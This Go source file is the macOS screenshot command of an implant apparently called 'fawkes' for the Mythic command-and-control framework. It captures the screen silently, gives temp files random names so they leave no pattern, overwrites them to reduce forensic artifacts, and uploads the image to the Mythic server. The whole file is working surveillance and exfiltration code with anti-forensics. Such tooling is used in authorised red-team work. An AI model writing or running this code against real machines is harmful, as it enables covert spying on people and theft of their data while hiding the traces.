//go:build darwin

package commands

import (
	"fmt"
	"os"
	"time"

	"fawkes/pkg/structs"
)

// ScreenshotDarwinCommand implements screenshot for macOS using screencapture CLI
type ScreenshotDarwinCommand struct{}

func (c *ScreenshotDarwinCommand) Name() string {
	return "screenshot"
}

func (c *ScreenshotDarwinCommand) Description() string {
	return "Capture a screenshot of the desktop (macOS screencapture)"
}

func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResult {
	// Create temp file for screenshot — random name (no distinctive pattern)
	tf, tfErr := os.CreateTemp("", "")
	if tfErr != nil {
		return errorf("Error creating temp file: %v", tfErr)
	}
	tmpFile := tf.Name()
	tf.Close()

	// Use screencapture: -x = no sound, -t png = PNG format
	if output, err := execCmdTimeout("screencapture", "-x", "-t", "png", tmpFile); err != nil {
		// Clean up on failure
		secureRemove(tmpFile)
		return errorf("Error capturing screenshot: %v\n%s", err, string(output))
	}

	// Read the screenshot file
	imgData, err := os.ReadFile(tmpFile)
	if err != nil {
		secureRemove(tmpFile)
		return errorf("Error reading screenshot file: %v", err)
	}

	// Clean up temp file — overwrite before removal to reduce forensic artifacts
	secureRemove(tmpFile)

	if len(imgData) == 0 {
		return errorResult("Screenshot captured but file was empty (no display available?)")
	}

	// Send screenshot to Mythic
	screenshotMsg := structs.SendFileToMythicStruct{}
	screenshotMsg.Task = &task
	screenshotMsg.IsScreenshot = true
	screenshotMsg.SendUserStatusUpdates = false
	screenshotMsg.Data = &imgData
	screenshotMsg.FileName = fmt.Sprintf("screenshot_%d.png", time.Now().Unix())
	screenshotMsg.FullPath = ""
	screenshotMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- screenshotMsg

	// Wait for transfer to complete
	for {
		select {
		case <-screenshotMsg.FinishedTransfer:
			return successf("Screenshot captured and uploaded (%d bytes)", len(imgData))
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return errorResult("Screenshot upload cancelled")
			}
		}
	}
}
